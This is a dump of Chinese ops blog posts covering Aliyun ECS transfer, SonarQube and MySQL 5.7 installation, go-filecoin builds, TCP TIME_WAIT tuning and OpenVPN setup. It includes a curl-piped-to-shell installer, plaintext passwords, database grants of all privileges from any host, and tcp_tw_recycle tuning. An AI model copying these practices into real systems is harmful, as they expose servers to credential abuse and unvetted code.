","permalink":"https://www.fenghong.tech/blog/ops/gogs-repo-install/","tags":["go","git","gogs"],"title":"Gogs仓库搭建"},{"categories":["ops"],"contents":"[TOC]\n项目背景 由于业务需求，主要就是公司分公司太多，费用计算发生变化，导致需要进行账户转移，需要将一台阿里云的ECS转移至其他账户下，因此写下这篇文章来进行记录，\n转移前 考虑到目前的ECS是有业务在跑的，首先考虑的就是业务不受影响转移,但是这个经过和阿里云沟通，发现必须重启实例方可转移。\n 项目的运行环境； 项目的后端数据库链接，中间件redis链接不可丢失； 项目的数据不可丢失(随实例创建的系统盘和数据盘可以一起过户。)； 进行镜像快照，如果转移失败可以根据快照重新开一台ECS； 原有的相关组件去除，如SLB关联相关的，必须取消，否则转移失败； 创建的ECS必须要有经典网络的安全组，这个必须和源ECS相同属性。 项目转移成功后各项服务重启 阿里云客服的及时沟通 保证目标账户余额充足，不然转移成功后，会发生因费用不足而拒绝服务。  阿里云官方提示： 需要提供： 源账号和目标账号 需要过户的实例ID列表 过户的目标安全组（目标安全组与目标交换机必须在同一个VPC内） 过户的目标交换机（目标交换机与过户的实例必须在同一个可用区内） VPC类型的ECS实例在过户前必须先停机，请您提前安排好停机时间。 源账号和目标账号如果存在欠费，必须先缴清欠费。 过户实例在源账号下关联的RDS、OSS、SLB等服务将会受到影响，实例源账号和目标账号需要提前做好业务变更准备。 转移中 时间定位在下班附近，开启转移操作~\n源账户提交工单进行转移操作，\n过户还需要目标账号提交一个同意接收主机的工单，如果创建不了经典组网络安全组，必须再次提交工单创建经典安全组权限。这个比较坑爹~话了很长时间才传递好\n源ECS的关联业务拆除，比如SLB；转移过程如有问题，根据客服的要求进行变更。\n这个转移过程中，有一个要确认关机重启的操作，谨慎点，做好通知、备份等工作后，再执行重启，按下确认按钮前想一想。\n转移后  挂载在实例上的独立云盘已经过户到目标账号下 实例已从源账号的安全组中移除，并且已经添加到目标账号的安全组中 ECS上服务检查，数据检查，服务重启 安全组更迭，增加原账户的相关权限（如RDS，OSS，REDIS）等内网权限 私有IP地址会发生变动，由目标交换机根据CIDR重新分配，（如果是很早分配的ip，基本是不会变动的）  ","permalink":"https://www.fenghong.tech/blog/ops/aliyu-ecs-transfor/","tags":["ops","devOps"],"title":"记一次阿里云服务器转移"},{"categories":["ops"],"contents":"[TOC]\n 域名已经备案，证书全部都有，也在后台配置了，但是安卓手机预览，还是请求失败， PC端和iphone端是可以请求数据出来的新版开发者工具增加了https检查功能；可使用此功能直接检查排查ssl协议版本问题： 报错request:fail ssl hand shake error。\n 问题来源：\n 测试环境的域名更改，区别于正式环境，进行了如下的变更。\n test_xiaowugui_video.jinxianghuangjin.com\u0026lt;--- xiaogui3.jinxianghuangjin.com test_gl.jinxianghuangjin.com\u0026lt;-------- gl.jinxianghuangjin.com test_xiaowugui.jinxianghuangjin.com\u0026lt;----xiaowugui.jinxianghuangjin.com  改变域名之后，网上访问正常，没有任何毛病。开发火急火燎的跑过来问我说是不是ssl证书失效了，小程序不行了，报错了。一脸懵，应该不会报错的啊，我这边访问一切正常，然后看到开发的程序log，有以上的报错，便有了这篇记录。\n 解决思路 方案 第一方案是缺少中间证书。详情可以看看这个网址微信小程序访问提示：request:failsslhandshakeerror.为了解决这个问题，重新换了新的ssl证书。但问题依旧没有解决。 更换域名 想到了域名更换引发的问题，便怀疑是不是域名有下划线的问题，然后去苹果ATS监测检测，发现域名检测不通，瞬间意识到了问题。更改域名即可解决问题。算是踩了一个小坑吧~\ntest-xiaowugui-video.jinxianghuangjin.com\u0026lt;--- xiaogui3.jinxianghuangjin.com test-gl.jinxianghuangjin.com\u0026lt;-------- gl.jinxianghuangjin.com test-xiaowugui.jinxianghuangjin.com\u0026lt;----xiaowugui.jinxianghuangjin.com 更换域名后，立马ATS检查通过。\n参考  证书常见问题：参考微信官方文档 域名监测ATS：参考苹果ATS监测 同时测试ios和安卓，假如有一方可以，一方不行，则是证书问题，请选用受认可的证书\n ","permalink":"https://www.fenghong.tech/blog/ops/fail-ssl-hand-shake-error/","tags":["linux","ssl"],"title":"小程序request:fail ssl hand shake error"},{"categories":["java","sonar"],"contents":"[TOC]\n权限控制  新建群组  管理员登陆，新建用户群组CAJX-group，手动将对应项目组用户添加至群组中：\n 新建权限模板  在新建权限模板时需要指定过滤条件，比如项目以CAJX开头，就在过滤条件中添加CAJX.*，下次新建的项目就会根据此过滤条件自动加入CAJX-group。\n 授权用户权限  创建CAJX-01用户，管理CAJX项目组\n 管理项目  创建项目标识，以CAJX开头的都会计入CAJX项目组，如果应用失败，可以手动应用至改权限模板。\n 访问  用对应权限账号登陆，即可看到属于自己群组的项目。\n","permalink":"https://www.fenghong.tech/blog/java/sonarqube-use/","tags":["java","sonar"],"title":"sonarqube 权限配置使用"},{"categories":["java","mysql"],"contents":"[TOC]\nmysql 5.7的优势 sonarqube建议我们使用mysql5.6或者mysql5.7；我这边选择了mysql5.7，网上查询到如下的优点~\n  对于多核CPU、固态硬盘、锁有着更好的优化，每秒100W QPS已不再是MySQL的追求，下个版本能否上200W QPS才是用户更关心的。 更好的InnoDB存储引擎 更为健壮的复制功能 复制带来了数据完全不丢失的方案，传统金融客户也可以选择使用。MySQL数据库。此外，GTID在线平滑升级也变得可能。 更好的优化器 优化器代码重构的意义将在这个版本及以后的版本中带来巨大的改进，Oracle官方正在解决MySQL之前最大的难题。 原生JSON类型的支持 更好的地理信息服务支持 InnoDB原生支持地理位置类型，支持GeoJSON，GeoHash特性 新增sys库 以后这会是DBA访问最频繁的库MySQL 5.7已经作为数据库可选项添加到《OneinStack》   安装依赖 编译依赖\n$ yum install ncurses-devel libaio-devel gcc -y  cmake编译  由于从 MySQL5.5 版本开始弃用了常规的 configure 编译方法，所以需要 CMake 编译器，用于设置 mysql 的编译参数。如：安装目录、数据存放目录、字符编码、排序规则等。\n$ cd /usr/local/src $ wget https://cmake.org/files/v3.8/cmake-3.8.0.tar.gz $ tar -zxvf cmake-3.8.0.tar.gz $ cd cmake-3.8.0 $ ./configure $ gmake -j `grep processor /proc/cpuinfo | wc -l` \u0026amp;\u0026amp; gmake install  bison编译  Linux 下 C/C++语法分析器\n$ cd /usr/local/src $ wget http://ftp.gnu.org/gnu/bison/bison-3.0.4.tar.gz $ tar -zxvf bison-3.0.4.tar.gz $ cd bison-3.0.4 $ ./configure $ make -j `grep processor /proc/cpuinfo | wc -l` \u0026amp;\u0026amp; make install  boost编译  从 MySQL 5.7.5 开始 Boost 库是必需的，mysql 源码中用到了 C++的 Boost 库，要求必须安装 boost1.59.0 或以上版本\n$ cd /usr/local/src $ wget https://nchc.dl.sourceforge.net/project/boost/boost/1.59.0/boost_1_59_0.tar.bz2 --no-check-certificate $ tar -jxvf boost_1_59_0.tar.bz2 $ mv boost_1_59_0 /usr/local/boost 编译安装  mysql源码下载地址sohu镜像mysql5.7.24  $ wget https://dev.mysql.com/get/archives/mysql-5.7/mysql-5.7.22.tar.gz $ tar xf mysql-5.7.22.tar.gz $ cmake . -DCMAKE_INSTALL_PREFIX=/usr/local/mysql-5.7.22 \\ -DMYSQL_DATADIR=/data/mysql57 \\ -DMYSQL_UNIX_ADDR=/data/mysql/data/mysql.sock \\ -DSYSCONFDIR=/usr/local/mysql-5.7.22/etc \\ -DDEFAULT_CHARSET=utf8 \\ -DDEFAULT_COLLATION=utf8_general_ci \\ -DEXTRA_CHARSETS=all \\ -DENABLED_LOCAL_INFILE=1 \\ -DWITH_MYISAM_STORAGE_ENGINE=1 \\ -DWITH_INNOBASE_STORAGE_ENGINE=1 \\ -DWITH_FEDERATED_STORAGE_ENGINE=1 \\ -DWITH_BLACKHOLE_STORAGE_ENGINE=1 \\ -DWITHOUT_EXAMPLE_STORAGE_ENGINE=1 \\ -DWITH_PARTITION_STORAGE_ENGINE=1 \\ -DENABLE_DOWNLOADS=1 \\ -DWITH_ZLIB=bundled \\ -DWITH_READLINE=1 \\ -DWITH_EMBEDDED_SERVER=1 \\ -DWITH_DEBUG=0 \\ -DWITH_BOOST=/usr/local/boost $ make -j `grep processor /proc/cpuinfo | wc -l` \u0026amp;\u0026amp; make install  配置文件,仅参考  $ cat \u0026gt; /etc/my.cnf \u0026lt;\u0026lt; EOF [mysql] # CLIENT # port = 3305 socket = /data/mysql57/mysql.sock [mysqld] # GENERAL # port = 3305 user = mysql default-storage-engine = InnoDB socket = /data/mysql57/mysql.sock pid-file = /data/mysql57/mysql.pid explicit_defaults_for_timestamp = 1 # INNODB # innodb-log-files-in-group = 2 innodb-log-file-size = 256M innodb-flush-log-at-trx-commit = 2 innodb-file-per-table = 1 innodb-buffer-pool-size = 2G # CACHES AND LIMITS # tmp-table-size = 32M max-heap-table-size = 32M max-connections = 4000 thread-cache-size = 50 open-files-limit = 4096 table-open-cache = 1600 # SAFETY # max-allowed-packet = 256M max-connect-errors = 1000000 # DATA STORAGE # datadir = /data/mysql57 # LOGGING # log-error = /data/mysql57/mysql-error.log log-bin = /data/mysql57/mysql-bin max_binlog_size = 1073741824 binlog-format = row server-id= 1  创建用户及目录  这边考虑到这台服务器已经运行了mariadb，只能多实例安装mysql-5.7.22，在/usr/local/mysql/etc/my.cnf创建了一个新的配置文件，可以参考上面的/etc/my.cnf进行配置。\n$ ln -sv /usr/local/mysql-5.7.22 /usr/local/mysql $ mkdir /data/mysql57 -p $ groupadd -r mysql \u0026amp;\u0026amp; useradd -r -g mysql -s /sbin/nologin -M mysql $ chown -R mysql.mysql /data/mysql57  启动服务及授权用户  # 创建数据库/data/mysql57相关文件 $ /usr/local/mysql/bin/mysqld --initialize-insecure --user=mysql --basedir=/usr/local/mysql --datadir=/data/mysql57 # 启动mysql服务 $ /usr/local/mysql/bin/mysqld_safe --defaults-file=/usr/local/mysql/etc/my.cnf \u0026amp;\u0026gt; /dev/null \u0026amp; # 设置root密码，可以跳过，进入数据库自己设置 $ /bin/mysql_secure_installation # 通过sock文件直接进入mysql，授权用户 $ mysql -S /data/mysql57/mysql.sock Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 192 Server version: 5.7.22-log Source distribution Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MySQL [(none)]\u0026gt; grant all privileges on *.* to 'louis@%' identified by 'hi.louis@888'; Query OK, 0 rows affected, 1 warning (0.00 sec) MySQL [(none)]\u0026gt; flush privileges; Query OK, 0 rows affected (0.01 sec)  说明\u0026rdquo;\u0026ndash;initialize-insecure\u0026quot;不会生成密码，MySQL之前版本mysql_install_db是在mysql_basedir/script下，MySQL 5.7直接放在了mysql_basedir/bin目录下。\n ","permalink":"https://www.fenghong.tech/blog/java/sonarqube-mysql/","tags":["mysql","sonar"],"title":"mysql-5.7.22 编译安装"},{"categories":["ops"],"contents":"[TOC]\n说明  # 开头的行表示注释 \u0026gt; 开头的行表示需要在 mysql 中执行 $ 开头的行表示需要执行的命令  先决条件和概述 运行SonarQube的唯一先决条件是在您的计算机上安装Java（Oracle JRE 8或OpenJDK 8）。\nmysql 5.6 or 5.7\nlinux 平台可以使用以下命令查看值：\nsysctl vm.max_map_count sysctl fs.file-max ulimit -n ulimit -u 可以通过运行以下命令动态设置它们：\nsysctl -w vm.max_map_count=262144 sysctl -w fs.file-max=65536 ulimit -n 65536 ulimit -u 2048 seccomp 您可以使用以下命令检查内核上是否有seccomp：\n$ grep SECCOMP /boot/config-$(uname -r) CONFIG_HAVE_ARCH_SECCOMP_FILTER=y CONFIG_SECCOMP_FILTER=y CONFIG_SECCOMP=y 如果你的内核没有有seccomp，你会看到：\n$ grep SECCOMP /boot/config-$(uname -r) # CONFIG_SECCOMP is not set 如果没有，则设置$SONARQUBE_HOME/conf/sonar.properties:\nsonar.search.javaAdditionalOpts=-Dbootstrap.system_call_filter=false 安装系统配置 CPU model : Intel(R) Xeon(R) CPU E5-26xx v4 @ 2.50GHz Number of cores : 4 CPU frequency : 2500.028 MHz Total amount of ram : 7821 MB Total amount of swap : 0 MB System uptime : up 148 days, 16:19 Load average : 0.34, 0.10, 0.07 OS : CentOS 7.5.1804 Arch : x86_64 (64 Bit) Kernel : 3.10.0-862.14.4.el7.x86_64 Hostname : dev IPv4 address : ********** 安装预览：\nmysql Ver 14.14 Distrib 5.6.42, for Linux (x86_64) using EditLine wrapper sonarqube-7.6 sonarqube Location: $SONAR_HOME=/usr/local/sonarqube Apache Maven 3.5.3 (3383c37e1f9e9b3bc3df5050c29c8aff9f295297; 2018-02-25T03:49:05+08:00) Maven home: /opt/apache-maven-3.5.3 java version \u0026quot;1.8.0_201\u0026quot; Java(TM) SE Runtime Environment (build 1.8.0_201-b09) Java HotSpot(TM) 64-Bit Server VM (build 25.201-b09, mixed mode) Default locale: en_US, platform encoding: UTF-8 sonarqube安装 下载.zip压缩包\n$ wget https://binaries.sonarsource.com/Distribution/sonarqube/sonarqube-7.6.zip $ unzip sonarqube-7.6.zip $ mv sonarqube-7.6 /usr/local/sonarqube $ cd /usr/local/sonarqube 创建数据库sonar并授权\n\u0026gt; CREATE DATABASE sonar CHARACTER SET utf8 COLLATE utf8_general_ci; \u0026gt; GRANT ALL PRIVILEGES ON *.* TO 'sonar'@'%' IDENTIFIED BY 'sonar'; \u0026gt; GRANT ALL PRIVILEGES ON *.* TO 'sonar'@'localhost' IDENTIFIED BY 'sonar'; \u0026gt; FLUSH PRIVILEGES; 添加sonar用户，es的启动必须非root用户，所以要创建一个用户，配置文件主要是数据库和端口。\n$ useradd sonar $ echo zNQ0G8GtN9jfLSGz |passwd --stdin sonar $ chown -R sonar.sonar ../sonarqube/ $ vim conf/sonar.properties sonar.jdbc.username=sonar sonar.jdbc.password=sonar sonar.jdbc.url=jdbc:mysql://localhost:3306/sonar?useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;rewriteBatchedStatements=true\u0026amp;useConfigs=maxPerformance\u0026amp;useSSL=false sonar.sorceEncoding=UTF-8 sonar.web.host=0.0.0.0 sonar.web.port=9999 sonar.web.context=/ sonar.scm.disabled=true 使用以下内容创建文件/etc/init.d/sonar：\n#!/bin/sh # # rc file for SonarQube # # chkconfig: 345 96 10 # description: SonarQube system (www.sonarsource.org) # ### BEGIN INIT INFO # Provides: sonar # Required-Start: $network # Required-Stop: $network # Default-Start: 3 4 5 # Default-Stop: 0 1 2 6 # Short-Description: SonarQube system (www.sonarsource.org) # Description: SonarQube system (www.sonarsource.org) ### END INIT INFO su sonar -lc \u0026quot;/usr/local/sonarqube/bin/linux-x86-64/sonar.sh $*\u0026quot; 注册服务cents6.5：\n$ ln -s $SONAR_HOME/bin/linux-x86-64/sonar.sh /usr/bin/sonar $ chmod +x /etc/init.d/sonar $ chkconfig --add sonar $ /etc/init.d/sonar start 查看端口是否开启:\n$ netstat -nlp|grep java tcp 0 0 0.0.0.0:9999 0.0.0.0:* LISTEN 27185/java tcp 0 0 127.0.0.1:45972 0.0.0.0:* LISTEN 27264/java tcp 0 0 127.0.0.1:32000 0.0.0.0:* LISTEN 27031/java tcp 0 0 127.0.0.1:9001 0.0.0.0:* LISTEN 27057/java 配置iptables:\n/sbin/iptables -I INPUT -p tcp --dport 9999 -j ACCEPT 至此，sonarqube部署完毕。\n汉化 登录之后全是英文，可以选择汉化 安装汉化包试试：页面上找到Administration \u0026gt; Marketplace，在搜索框中输入chinese，出现一个Chinese Pack，点击右侧的install按钮。 安装成功后，会提示重启 SonarQube 服务器。 稍等一会，再看页面上已经显示中文了。\nSonarQube Scanner for Maven 兼容性 maven-sonar-plugin 3.4.0.905之前版本，不再支持SonarQube \u0026lt;5.6。 如果使用5.6之前的SonarQube实例，则应使用maven-sonar-plugin 3.3.0.603。 maven-sonar-plugin 3.1之前版本，不再支持Maven \u0026lt;3.0。 如果在3.0之前使用Maven，则应使用maven-sonar-plugin 3.0.2。 先决条件  Maven 3.x SonarQube已经 安装好了 SonarQube服务器有jdk8  全局设置 编辑位于$MAVEN_HOME/conf中的 settings.xml文件，以设置SonarQube服务器。\n例：\n\u0026lt;settings\u0026gt; \u0026lt;pluginGroups\u0026gt; \u0026lt;pluginGroup\u0026gt;org.sonarsource.scanner.maven\u0026lt;/pluginGroup\u0026gt; \u0026lt;/pluginGroups\u0026gt; \u0026lt;profiles\u0026gt; \u0026lt;profile\u0026gt; \u0026lt;id\u0026gt;sonar\u0026lt;/id\u0026gt; \u0026lt;activation\u0026gt; \u0026lt;activeByDefault\u0026gt;true\u0026lt;/activeByDefault\u0026gt; \u0026lt;/activation\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;!-- Optional URL to server. Default value is http://localhost:9000 --\u0026gt; \u0026lt;sonar.host.url\u0026gt; http://myserver:9999 \u0026lt;/sonar.host.url\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;/profile\u0026gt; \u0026lt;/profiles\u0026gt; \u0026lt;/settings\u0026gt; 分析Maven项目 分析Maven项目,在pom.xml文件所在的目录中,运行Maven：mvn sonar:sonar。\nmvn clean verify sonar:sonar # In some situation you may want to run sonar:sonar goal as a dedicated step. Be sure to use install as first step for multi-module projects mvn clean install mvn sonar:sonar # Specify the version of sonar-maven-plugin instead of using the latest. See also 'How to Fix Version of Maven Plugin' below. mvn org.sonarsource.scanner.maven:sonar-maven-plugin:3.6.0.1398:sonar sonar-scanner 3.3.0 $ wget https://binaries.sonarsource.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-3.3.0.1492-linux.zip $ unzip sonar-scanner-cli-3.3.0.1492-linux.zip $ mv sonar-scanner-3.3.0.1492-linux/ /usr/local/sonar-scanner $ vim /etc/profile export SONAR_SACNNER=/usr/local/sonar-scanner export PATH=$SONAR_SACNNER/bin:$PATH $ . /etc/profile 配置sonar-project.properties\n$ vim sonar-project.properties sonar.projectKey=test sonar.projectName=test sonar.sources=src/ sonar.language=java sonar.sourceEncoding=UTF-8 sonar.host.url=http://myserver:9999 sonar.login=*********************** sonar.projectVersion=1.0 sonar.java.binaries=target/classes 运行命令即可\n$ sonar-scanner usage: sonar-scanner [options] Options: -D,--define \u0026lt;arg\u0026gt; Define property -h,--help Display help information -v,--version Display version information -X,--debug Produce execution debug output $ sonar-scanner -v INFO: Scanner configuration file: /usr/local/sonar-scanner/conf/sonar-scanner.properties INFO: Project root configuration file: NONE INFO: SonarQube Scanner 3.3.0.1492 INFO: Java 1.8.0_121 Oracle Corporation (64-bit) INFO: Linux 3.10.0-862.2.3.el7.x86_64 amd64 ","permalink":"https://www.fenghong.tech/blog/java/sonarqube/","tags":["java","sonar"],"title":"sonarqube 安装部署"},{"categories":["tools"],"contents":"[TOC]\nIPFS 与 FileCoin  IPFS 是一个网络协议，对标 HTTP 协议，中文叫做星际文件系统。IPFS 本质上是一种点对点的分布式文件系统， 旨在连接所有有相同的文件系统的计算机设备。在某些方面， IPFS 类似于 web, 但 web 是中心化的，而 IPFS 是一个单一的 Bittorrent 群集， 用 git 仓库分布式存储。换句话说， IPFS 提供了高吞吐量的内容寻址块存储模型， 具有内容寻址的超链接。这形成了一个广义的Merkle DAG 数据结构，可以用这个数据结构构建版本文件系统，区块链，甚至是永久性网站。IPFS 结合了分布式哈希表， 带有激励机制的块交换和自我认证命名空间。IPFS 没有单故障点， 节点不需要相互信任。\n  Filecoin 是一个去中心化存储网络，它让云存储变成一个算法市场。这个市场运行在有着本地协议令牌（也叫做 Filecoin）的区块链。区块链中的矿工可以通过为客户提供存储来获取 Filecoin；相反的，客户可以通过花费 Filecoin 来雇佣矿工来存储或分发数据。和比特币一样，Filecoin 的矿工们为了巨大的奖励而竞争式挖区块，但 Filecoin 的挖矿效率是与存储活跃度成比例的，这直接为客户提供了有用的服务（不像比特币的挖矿仅是为了维护区块链的共识）。这种方式给矿工们创造了强大的激励，激励他们尽可能多的聚集存储器并且把它们出租给客户们。Filecoin 协议将这些聚集的资源编织成世界上任何人都能依赖的自我修复的存储网络。该网络通过复制和分散内容实现鲁棒性，同时自动检测和修复副本失败。客户可以选择复制参数来防范不同的威胁模型。该协议的云存储网络还提供了安全性，因为内容是在客户端端对端加密的，而存储提供者不能访问到解密秘钥。\n当 Filecoin 与 IPFS 走在一起，Filecoin 则是运行在 IPFS 上面的一个激励层\n go-filecoin安装 系统要求： Linux and MacOS systems ，windows暂不支持\ngo-filecoin是go\u0026amp;rustc语言编写，且一些源码是放在Google上的，需要翻墙~\ngo二进制安装 ]$ wget https://dl.google.com/go/go1.11.5.linux-amd64.tar.gz ]$ tar xf go1.11.5.linux-amd64.tar.gz -C /usr/local/ ]$ vim /etc/profile ##在最后行加入下面信息## export GOROOT=\u0026quot;/usr/local/go\u0026quot; ##这个很关键，go编译的gx工具都生成在GOPATH里面，如果不在$PATH里面，会报错## export GOPATH=\u0026quot;/root/go\u0026quot; export PATH=$PATH:$GOROOT/bin:$GOPATH/bin ##configure vps proxy ## export https_proxy=http://127.0.0.1:8118/ export http_proxy=http://127.0.0.1:8118/ ]$ . /etc/profile rustc脚本安装 ]$ curl https://sh.rustup.rs -sSf | sh ]$ source $HOME/.cargo/env proxy翻墙代理 ]$ yum install python-pip ]$ pip install git+https://github.com/shadowsocks/shadowsocks.git@master ]$ pip install --upgrade pip ]$ vim /etc/shadowsocks.json ]$ sslocal -c /etc/shadowsocks.json -d start ]$ yum install -y privoxy ]$ vim /etc/privoxy/config ]$ echo 'forward-socks5 / 127.0.0.1:1080 . ' \u0026gt; /etc/privoxy/config ]$ service privoxy start ]$ export http_proxy=http://127.0.0.1:8118/ ]$ export https_proxy=http://127.0.0.1:8118/ go-filecoin安装 cd ${GOPATH}/src/github.com/filecoin-project/go-filecoin FILECOIN_USE_PRECOMPILED_RUST_PROOFS=true go run ./build/*.go deps 中间有报错缺少GLIBC_2.18,需要安装编译\n]$ strings /usr/lib64/libc.so.6 | grep ^GLIBC_ ]$ cd ]$ curl -O http://ftp.gnu.org/gnu/glibc/glibc-2.18.tar.gz ]$ tar zxf glibc-2.18.tar.gz ]$ cd glibc-2.18/ ]$ mkdir build ]$ cd build/ ]$ ../configure --prefix=/usr ]$ make -j2 \u0026amp;\u0026amp; make install ]$ strings /usr/lib64/libc.so.6 | grep ^GLIBC_ ]$ cd ${GOPATH}/src/github.com/filecoin-project/go-filecoin ]$ ./proofs/bin/paramcache ]$ go run ./build/main.go build ]$ go run ./build/main.go install 安装好go-filecoin,可以开始了Getting Started,也可以Mining-Filecoin\n编译安装大概花了1个小时，中间陆陆续续踩的坑~\n参考  官方github  ","permalink":"https://www.fenghong.tech/blog/technology/go-filecoin/","tags":["filecoin","go"],"title":"go-filecoin"},{"categories":["tools"],"contents":"[TOC]\nlinux上大量tcp端口处于TIME_WAIT的问题 最近发现几个监控用的脚本在连接监控数据库的时候偶尔会连不上，报错：\n Couldn't connect to host:3306/tcp: IO::Socket::INET: connect: Cannot assign requested address 查看了一下发现系统中存在大量处于TIME_WAIT状态的tcp端口\n$netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}' TIME_WAIT 50013 ESTABLISHED 27 SYN_RECV 1 由于要监控的主机太多，监控的agent可能在短时间内创建大量连接到监控数据库(MySQL)并释放造成的。在网上查阅了一些tcp参数的相关资料，最后通过修改了几个系统内核的tcp参数缓解了该问题：\n#vi /etc/sysctl.conf net.ipv4.tcp_tw_reuse = 1 net.ipv4.tcp_tw_recycle = 1 #sysctl -p 其中： net.ipv4.tcp_tw_reuse = 1 表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭； net.ipv4.tcp_tw_recycle = 1 表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭。\n修改完成并生效后，系统中处于TIME_WAIT状态的tcp端口数量迅速下降到100左右：\n$netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}' TIME_WAIT 82 ESTABLISHED 36 简单记录于此，备忘。\n","permalink":"https://www.fenghong.tech/blog/tools/linnux-tcp-timewait/","tags":["tcp"],"title":"Linux上tcp处于time_wait"},{"categories":["ops"],"contents":"[TOC]\n为了方便团队成员从异地访问开发环境，考虑使用OpenVPN搭建虚拟局域网。部署的环境和版本信息如下:\n CentOS 7 OpenVPN  1.easy-rsa生成证书 从这里下载easy-rsa。\n$ unzip easy-rsa-old-master.zip $ cd easy-rsa-old-master/easy-rsa/2.0 $ ls build-ca build-key-pkcs12 inherit-inter pkitool build-dh build-key-server list-crl revoke-full build-inter build-req openssl-0.9.6.cnf sign-req build-key build-req-pass openssl-0.9.8.cnf vars build-key-pass clean-all openssl-1.0.0.cnf whichopensslcnf $ln -s openssl-1.0.0.cnf openssl.cnf 可修改vars文件中定义的变量用于生成证书的基本信息。下面生成CA证书：\n$source vars $./clean-all $./build-ca 因为已经在var中填写了证书的基本信息，所以一路回车即可。生成证书如下：\n$ ls keys/ ca.crt ca.key index.txt serial 生成服务器端秘钥：\n$ ./build-key-server server ...... Common Name (eg, your name or your server's hostname) [server]: A challenge password []:1234 ...... $ ls keys 01.pem ca.crt ca.key index.txt index.txt.attr index.txt.old serial serial.old server.crt server.csr server.key 生成客户端证书：\n$ ./build-key client ...... Common Name (eg, your name or your server's hostname) [client]: A challenge password []:1234 ......  Common Name用于区分客户端，不同的客户端应该有不同的名称。\n Generating DH parameters：\n$ ./build-dh $ ls keys/ 01.pem 02.pem ca.crt ca.key client.crt client.csr client.key dh2048.pem index.txt index.txt.attr index.txt.attr.old index.txt.old serial serial.old server.crt server.csr server.key 2.编译OpenVPN 2.1 安装依赖 pam-devel 和 lzo：\n$ yum install -y pam-devel ;lzo-devel 2.2 编译安装OpenVPN 下载OpenVPN源码：\n$ wget https://swupdate.openvpn.org/community/releases/openvpn-2.4.4.tar.gz 编译安装OpenVPN：\n$ tar -zxvf openvpn-2.4.4.tar.gz $ cd openvpn-2.4.4 $ ./configure --prefix=/usr/local/openvpn $ make $ make install 3.配置OpenVPN 创建配置文件目录和证书目录：\n$ mkdir -p /etc/openvpn $ mkdir -p /etc/openvpn/pki 生成tls-auth key并将其拷贝到证书目录中：\n$ /usr/local/openvpn/sbin/openvpn --genkey --secret ta.key $ mv ta.key /etc/openvpn/pki 将签名生成的CA证书秘钥和服务端证书秘钥拷贝到证书目录中：\n$ cp ca.key ca.crt server.crt server.key dh2048.pem /etc/openvpn/pki/ $ ls /etc/openvpn/pki/ ca.crt ca.key dh2048.pem server.crt server.key 将OpenVPN源码下的配置文件sample/sample-config-files/server.conf拷贝到/etc/openvpn目录。\n编辑服务端配置文件/etc/openvpn/server.conf：\n$ vim /etc/openvpn/server.conf local 192.168.1.2 # 服务端IP port 1194 proto tcp dev tun ca /etc/openvpn/pki/ca.crt cert /etc/openvpn/pki/server.crt key /etc/openvpn/pki/server.key dh /etc/openvpn/pki/dh2048.pem server 10.8.0.0 255.255.255.0 # 分配给客户端的虚拟局域网段 ifconfig-pool-persist ipp.txt # 推送路由和DNS到客户端 push \u0026quot;route 192.168.1.0 255.255.255.0\u0026quot; push \u0026quot;redirect-gateway def1 bypass-dhcp\u0026quot; push \u0026quot;dhcp-option DNS 192.168.1.1\u0026quot; push \u0026quot;dhcp-option DNS 8.8.8.8\u0026quot; client-to-client keepalive 10 120 tls-auth /etc/openvpn/pki/ta.key 0 cipher AES-256-CBC comp-lzo max-clients 10 user nobody group nobody persist-key persist-tun status /var/log/openvpn-status.log log /var/log/openvpn.log log-append /var/log/openvpn.log verb 3 确认内核已经开启路由转发功能:\n$ sysctl net.ipv4.ip_forward net.ipv4.ip_forward = 1 确认iptables filter表的FOWARD链是ACCEPT状态：\n$ iptables -nvL $ iptables -P FORWARD ACCEPT 添加iptables转发规则，对所有源地址（openvpn为客户端分配的地址）为10.8.0.0/24的数据包转发后进行源地址转换，伪装成openvpn服务器内网地址192.168.1.2， 这样VPN客户端就可以访问服务器内网的其他机器了。\n$ iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o em1 -j SNAT --to-source 192.168.1.2 贴一下我的iptables表：\n# Generated by iptables-save v1.4.7 on Wed Jan 30 10:50:41 2019 *nat :PREROUTING ACCEPT [511307:27018662] :POSTROUTING ACCEPT [0:0] :OUTPUT ACCEPT [8863045:542441750] -A POSTROUTING -j MASQUERADE -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE COMMIT # Completed on Wed Jan 30 10:50:41 2019 # Generated by iptables-save v1.4.7 on Wed Jan 30 10:50:41 2019 *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [8105799:4491852599] :OUTPUT ACCEPT [579627360:226177092815] -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A INPUT -p icmp -j ACCEPT -A INPUT -i lo -j ACCEPT -A INPUT -p udp -m state --state NEW -m udp --dport 1194 -j ACCEPT -A INPUT -p tcp -m tcp --dport 1194 -j ACCEPT -A INPUT -p udp -m udp --dport 1194 -j ACCEPT -A INPUT -j REJECT --reject-with icmp-host-prohibited COMMIT # Completed on Wed Jan 30 10:50:41 2019 创建openvpn的systemd unit文件：\ncat \u0026gt; /etc/systemd/system/openvpn.service \u0026lt;\u0026lt;EOF [Unit] Description=openvpn After=network.target [Service] EnvironmentFile=-/etc/openvpn/openvpn ExecStart=/usr/local/openvpn/sbin/openvpn \\ --config /etc/openvpn/server.conf Restart=on-failure Type=simple LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF 启动并设置为开机启动：\n$ systemctl start openvpn $ systemctl enable openvpn 查看端口监听：\n$ netstat -nltp | grep 1194 tcp 0 0 192.168.1.2:1194 0.0.0.0:* 88462/openvpn 4.客户端连接测试 从这里下载OPENVPN的windows客户端，安装完成后。 将以下证书和秘钥文件拷贝到安装目录中C:\\Program Files\\OpenVPN\\config：\nca.crt client.crt client.key ta.key 在这个目录下创建客户端的配置文件client.ovpn：\nclient dev tun proto tcp remote 